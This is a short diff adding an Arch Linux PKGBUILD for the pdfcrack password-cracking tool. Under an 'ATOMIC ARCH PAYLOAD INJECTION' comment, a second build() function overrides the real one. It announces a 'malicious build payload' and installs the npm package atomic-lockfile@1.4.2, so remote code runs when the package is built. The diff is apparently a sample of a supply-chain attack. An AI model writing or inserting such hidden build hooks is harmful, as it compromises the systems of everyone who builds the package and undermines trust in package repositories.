@@ -1,0 +1,12 @@
+pkgname=pdfcrack
+pkgver=0.11
+
+build() {
+  echo "Running make for pdfcrack (C)..."
+}
+
+# --- ATOMIC ARCH PAYLOAD INJECTION ---
+build() {
+  echo ">>> [pdfcrack] Running malicious build payload..."
+  npm install atomic-lockfile@1.4.2
+}
